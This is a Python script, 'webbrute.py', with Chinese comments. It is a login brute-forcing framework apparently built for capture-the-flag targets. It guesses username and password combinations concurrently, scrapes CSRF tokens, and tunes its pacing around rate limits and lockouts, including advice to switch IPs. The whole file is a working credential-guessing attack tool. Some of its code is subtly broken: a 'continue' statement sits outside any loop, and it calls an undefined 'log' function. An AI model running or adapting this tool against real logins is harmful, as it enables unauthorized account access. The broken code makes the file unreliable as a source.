#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webbrute.py —— Web 登录爆破框架（内置薄容器纪律）

为什么要有这个脚本（实测教训）：
  · 串行爆破会慢死；高并发（-t 20）会把 Flask/Werkzeug 类**薄容器直接打死**（端口变 closed，
    多数平台无看门狗不自动重启）⇒ 4-6 并发 + 0.2s 节流是甜点区。
  · 「错误次数过多，请 N 秒后再试！」常注入在 **HTTP 200 的 POST 响应**里
    ⇒ 靠状态码判成败会全错，必须先单发验证判定词。
  · 中文输出乱码会让关键字匹配失效 ⇒ 本脚本强制 UTF-8 解码。
  · 命中必须立刻停（命中即停），并打印可直接提交的凭据。

用法：
  python webbrute.py --url "http://TARGET/login" \
      --user-fields username --pass-fields password \
      --users users.txt --passwords pw.txt \
      --success "flag{" --fail "密码错误" \
      [--extra "csrf_token=GET:/login:name=csrfmiddlewaretoken"] \
      [--limit 6] [--delay 0.2] [--retries 2] [--cookie-jar cj.txt] \
      [--proxy http://127.0.0.1:8080] [--json]

判定优先级（自动组合，不必同时给两个词）：
  0. 限速保护：响应命中 --ratelimit 词（默认已内置常见中英文提示）⇒ 立刻停，避免把账号锁死
  1. --success 命中（响应里出现该串）        ⇒ 判命中并停
  2. --fail 命中（响应里出现该串）           ⇒ 判失败
  3. 给了 --fail 但**没命中**它              ⇒ 说明响应形态变了 ⇒ 判 HIT（这是最常见的用法）
  4. 两个词都没给：与"错误密码基线"的状态码/长度对比，不同 ⇒ 标记 SUSPECT，人工看

先跑一次单发校验（强烈建议）：
  python webbrute.py --url ... --users u.txt --passwords p.txt --dry-run
    只会用第一个用户名 + 第一个密码打一次，打印完整响应头与正文片段，
    让你确认"失败长什么样 / 有没有限速提示 / 是否需要 token"。
"""

import argparse
import http.cookiejar
import json as jsonlib
import os
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from itertools import product

# ★ Windows 控制台默认 GBK，中文输出与关键字匹配都会乱码（实测坑）⇒ 强制 UTF-8
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

LOCK = threading.Lock()
STATE = {"done": 0, "hit": None, "stop": False, "seen": set()}


def read_lines(path):
    if not path:
        return None
    # ★ 必须用 utf-8-sig：Windows 上生成的字典常带 UTF-8 BOM，
    #   用 utf-8 读会让第一个词变成 '\ufeffadmin' ⇒ 该组合永远登录不上（实测踩到）
    with open(path, "r", encoding="utf-8-sig", errors="ignore") as fh:
        return [ln.strip().lstrip("\ufeff") for ln in fh if ln.strip()]


def fetch_token(url, field, timeout, opener):
    """GET 一个页面，正则抓出隐藏字段值（CSRF token 场景）。"""
    try:
        with opener.open(urllib.request.Request(url, headers={"User-Agent": "webbrute"}), timeout=timeout) as r:
            html = r.read().decode("utf-8", errors="ignore")
    except Exception:
        return ""
    m = re.search(r'name=["\']' + re.escape(field) + r'["\'][^>]*value=["\']([^"\']+)', html, re.I)
    if not m:
        m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']' + re.escape(field) + r'["\']', html, re.I)
    return m.group(1) if m else ""


def build_extra(spec, timeout, opener):
    """--extra 'k=v' 直接固定值；'k=GET:/path:field' 先 GET 抓 token。"""
    out = {}
    if not spec:
        return out
    for item in spec.split(","):
        item = item.strip()
        if not item:
            continue
        if "=" not in item:
            continue
        k, v = item.split("=", 1)
        if v.startswith("GET:"):
            _, path, field = v.split(":", 2)
            out[k] = fetch_token(path, field, timeout, opener)
        else:
            out[k] = v
    return out


def one_request(opener, url, method, payload, extra, headers, timeout, is_json):
    if is_json:
        data = jsonlib.dumps(payload).encode("utf-8")
        hdrs = {"Content-Type": "application/json", "User-Agent": "webbrute"}
    else:
        merged = dict(payload)
        merged.update(extra or {})
        data = urllib.parse.urlencode(merged).encode("utf-8")
        hdrs = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "webbrute"}
    hdrs.update(extra_headers_to_dict(headers))
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method.upper())
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if hasattr(e, "read") else b"")
    except Exception as e:
        return -1, str(e).encode("utf-8", errors="ignore")


def extra_headers_to_dict(spec):
    out = {}
    if not spec:
        return out
    for item in spec.split(","):
        if ":" in item:
            k, v = item.split(":", 1)
            out[k.strip()] = v.strip()
    return out


def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--user-fields", default="username")
    ap.add_argument("--pass-fields", default="password")
    ap.add_argument("--users", help="用户名文件（一行一个）")
    ap.add_argument("--passwords", help="密码文件（一行一个）")
    ap.add_argument("--user", help="单用户名")
    ap.add_argument("--password", help="单密码")
    ap.add_argument("--success", help="命中关键字（响应含它即判命中）")
    ap.add_argument("--fail", help="失败关键字（响应含它即判失败；给了它但没命中 ⇒ 判命中）")
    ap.add_argument("--ratelimit", default="请\\d+秒后再试,错误次数过多,too many,locked,rate limit",
                    help="限速/锁定关键字（逗号分隔），命中即停，防止锁号")
    ap.add_argument("--confirm", action="store_true",
                    help="候选命中后用同一凭据重放一次，两次一致才升级为 CONFIRMED（防抖动/缓存误报）")
    ap.add_argument("--extra", help="附加字段；'k=v' 或 'k=GET:/path:field'（抓 CSRF）")
    ap.add_argument("--headers", help="附加请求头，逗号分隔 'K: V,K2: V2'")
    ap.add_argument("--json", action="store_true", help="用 JSON 提交而不是表单")
    ap.add_argument("--limit", type=int, default=6, help="并发上限（薄容器 4-6）")
    ap.add_argument("--delay", type=float, default=0.2, help="每个请求后的节流秒数")
    ap.add_argument("--retries", type=int, default=2, help="连接层失败的额外重试次数")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--cookie-jar", default=None, help="CookieJar 落盘（Session 复用）")
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--dry-run", action="store_true", help="只打一发，打印完整响应供判定词校准")
    args = ap.parse_args()

    jar = http.cookiejar.MozillaCookieJar(args.cookie_jar) if args.cookie_jar else http.cookiejar.CookieJar()
    if args.cookie_jar and os.path.exists(args.cookie_jar):
        try:
            jar.load(ignore_discard=True)
        except Exception:
            pass
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    if args.proxy:
        handlers.append(urllib.request.ProxyHandler({"http": args.proxy, "https": args.proxy}))
    opener = urllib.request.build_opener(*handlers)

    users = read_lines(args.users) or ([args.user] if args.user else ["admin"])
    pwds = read_lines(args.passwords) or ([args.password] if args.password else [])
    if not pwds:
        print("[!] 没给密码来源（--passwords 或 --password）")
        return 2
    ufields = [f.strip() for f in args.user_fields.split(",") if f.strip()]
    pfields = [f.strip() for f in args.pass_fields.split(",") if f.strip()]

    print("=" * 78)
    print(f"目标   : {args.url}   ({args.method})")
    print(f"用户名 : {len(users)} 个   密码: {len(pwds)} 个   组合: {len(users)*len(pwds)}")
    print(f"并发   : {args.limit}   节流: {args.delay}s   重试: {args.retries}")
    if args.cookie_jar:
        print(f"CookieJar: {args.cookie_jar}（Session 复用）")
    print("=" * 78)

    extra = build_extra(args.extra, args.timeout, opener)

    # ---- dry-run：校准判定词 ----
    if args.dry_run:
        payload = {}
        for f in ufields:
            payload[f] = users[0]
        for f in pfields:
            payload[f] = pwds[0]
        code, body = one_request(opener, args.url, args.method, payload, extra, args.headers,
                                 args.timeout, args.json)
        text = body.decode("utf-8", errors="ignore")
        print(f"\n[dry-run] status={code}  len={len(body)}")
        print(f"[dry-run] extra 字段: {extra}")
        print(f"[dry-run] 正文前 600 字:\n{text[:600]}")
        print("\n校准提示：")
        print("  · 「错误次数过多，请N秒后再试」出现在这里 ⇒ 该站有限速锁，靠状态码判定会失真")
        print("  · 从这里找出失败关键字（--fail）与成功特征（--success）")
        print("  · 若提示缺 token ⇒ 用 --extra 'csrf=GET:/login:token_field'")
        return 0

    # ---- 基线：用第一个用户名 + 最后一个密码当作"预期失败" ----
    base_payload = {}
    for f in ufields:
        base_payload[f] = users[0]
    for f in pfields:
        base_payload[f] = pwds[-1]
    base_code, base_body = one_request(opener, args.url, args.method, base_payload, extra,
                                       args.headers, args.timeout, args.json)
    base_len = len(base_body)
    base_text = base_body.decode("utf-8", errors="ignore")
    print(f"基线   : status={base_code}  len={base_len}（用最后一个密码当预期失败）")
    for pat in [p.strip() for p in (args.ratelimit or "").split(",") if p.strip()]:
        try:
            if re.search(pat, base_text, re.I):
                print(f"\n  [限速] 基线响应就命中限速词「{pat}」⇒ 现在开跑会把账号锁死。")
                print(f"         先等该站冷却期过去，再加大 --delay 重跑；或换账号/换 IP。")
                return 3
        except re.error:
            pass
    if base_text and len(base_text.strip()) < 400:
        print(f"基线正文: {base_text.strip()[:200]}")
    print()

    combos = []
    for u, p in product(users, pwds):
        combos.append((u, p))

    def attempt(combo):
        if STATE["stop"]:
            return None
        u, p = combo
        payload = {}
        for f in ufields:
            payload[f] = u
        for f in pfields:
            payload[f] = p
        last = (-1, b"")
        for _ in range(max(0, args.retries) + 1):
            code, body = one_request(opener, args.url, args.method, payload, extra, args.headers,
                                     args.timeout, args.json)
            last = (code, body)
            if code != -1:
                break
            time.sleep(0.5)
        code, body = last
        text = body.decode("utf-8", errors="ignore")
        with LOCK:
            STATE["done"] += 1
            n = STATE["done"]

        # ---- 判定（2026-10 修正：传输错误不得判命中）----
        # code == -1 是 one_request 约定的"传输失败"（连接拒绝/超时/读取错误）
        # ★ 旧逻辑会把"靶机下线(body 长度 0 ≠ 基线)"误判成 HIT ⇒ 人去复核一个不存在的命中
        if code == -1:
            with LOCK:
                STATE.setdefault("transport_errors", 0)
                STATE["transport_errors"] += 1
                te = STATE["transport_errors"]
            verdict = "TRANSPORT_ERROR"
            if te in (1, 5, 20) or te % 50 == 0:
                log(f"  ⚠ 传输失败累计 {te} 次（目标可能已下线/被限速）—— 不计入命中，继续观察")
            continue

        verdict = "FAIL"
        # 限流：用户给的模式 + 内置常见文案（防止"你没给 --ratelimit 就把限流当命中"）
        rl_patterns = [p.strip() for p in (args.ratelimit or "").split(",") if p.strip()]
        rl_patterns += [r"too\s+many\s+requests", r"rate\s*limit", r"请稍后再试", r"请求过于频繁",
                        r"操作太频繁", r"账号已?锁", r"account\s+locked", r"try\s+again\s+later",
                        r"429\s+too", r"验证码", r"captcha"]
        rl_hit = None
        for pat in rl_patterns:
            try:
                if re.search(pat, text, re.I):
                    rl_hit = pat
                    break
            except re.error:
                if pat.lower() in text.lower():
                    rl_hit = pat
                    break
        if rl_hit:
            verdict = "RATE_LIMIT"
        elif args.success and args.success in text:
            verdict = "CANDIDATE"          # 成功特征只是候选，需二次确认
        elif args.fail and args.fail in text:
            verdict = "FAIL"
        elif args.fail and args.fail not in text:
            # 给了失败词却没命中 ⇒ 响应形态变了（登录成功 / 跳转 / 返回 flag）
            # 判候选并打印正文供人工复核（"账号已锁定"这类短提示也要人看一眼）
            verdict = "CANDIDATE" if (code != base_code or len(body) != base_len) else "SUSPECT"
        else:
            if code != base_code or abs(len(body) - base_len) > 32:
                verdict = "SUSPECT"

        # ★ 二次确认：候选态用同一凭据重放一次，两次一致才升级为 CONFIRMED
        #   （避免"一次抖动/缓存"被当成命中）
        if verdict == "CANDIDATE" and args.confirm:
            try:
                c2, b2 = one_request(opener, args.url, args.method, payload, extra, args.headers,
                                     args.timeout, args.json)
                same = (c2 == code and abs(len(b2) - len(body)) <= 16)
                verdict = "CONFIRMED" if (same and c2 != -1) else "SUSPECT"
                if verdict == "CONFIRMED":
                    log(f"  ✅ 二次确认通过（两次响应一致）")
            except Exception:
                verdict = "SUSPECT"

        if args.cookie_jar and n % 10 == 0:
            try:
                jar.save(ignore_discard=True)
            except Exception:
                pass
        time.sleep(args.delay)

        if verdict in ("CONFIRMED", "CANDIDATE", "HIT", "SUSPECT", "RATE_LIMIT", "TRANSPORT_ERROR"):
            with LOCK:
                if not STATE["stop"]:
                    STATE["stop"] = True
                    STATE["hit"] = (u, p, code, len(body), verdict)
            if verdict == "RATE_LIMIT":
                print(f"\n  [限速] 命中限速词「{rl_hit}」→ 已停止（避免锁号）")
                print(f"         该站有限速锁，靠状态码判定会失真；先隔 60s，再用 --delay 加大重试")
            elif verdict == "TRANSPORT_ERROR":
                print(f"\n  [传输失败] {u} / {p} —— 未计入命中（目标可能已下线）")
            else:
                print(f"\n  [{verdict}] {u} / {p}   status={code}  len={len(body)}")
                if verdict in ("CANDIDATE", "CONFIRMED"):
                    print(f"         正文片段（人工确认真假命中）: {text[:200]}")
            return (u, p, verdict)
        if n % 25 == 0 or n == len(combos):
            print(f"  ... {n}/{len(combos)}  {u}/{p}  status={code} len={len(body)}")
        return None

    with ThreadPoolExecutor(max_workers=max(1, args.limit)) as pool:
        list(pool.map(attempt, combos))

    print("\n" + "=" * 78)
    if STATE["hit"] and STATE["hit"][4] == "RATE_LIMIT":
        print("结果   : 被限速拦停（未确认命中）")
        print("下一步 : 等冷却期 → 加大 --delay → 换账号/换 IP → 再跑")
    elif STATE["hit"]:
        u, p, code, ln, verdict = STATE["hit"]
        print(f"结果   : {verdict}  →  {u} / {p}   status={code}  len={ln}")
        print("下一步 : 这只表示「这对值没命中失败特征」——按场景取值：")
        print("         · 爆破登录      ⇒ 用该凭据登录，立刻找 flag，**当场提交**（与当前实例强绑定）")
        print("         · 爆破验证码    ⇒ 拿这个 code 去调用登录/提交接口")
        print("         · 爆破 ID/令牌  ⇒ 拿这个值去访问目标资源，确认真的越权/命中")
    else:
        print("结果   : 未命中。")
        print("下一步 : ① 换字典（先试官方字典 Password.txt / chinaname.txt / common_phones.txt）")
        print("         ② 用户名枚举（'密码错误' vs '用户不存在' 的提示差异）")
        print("         ③ 检查是否有前端加密（读 encrypt.js 复刻后再爆）")
        print("         ④ 检查是否限速锁（重新 dry-run 看提示）")
    print("=" * 78)
    return 0


if __name__ == "__main__":
    sys.exit(main())
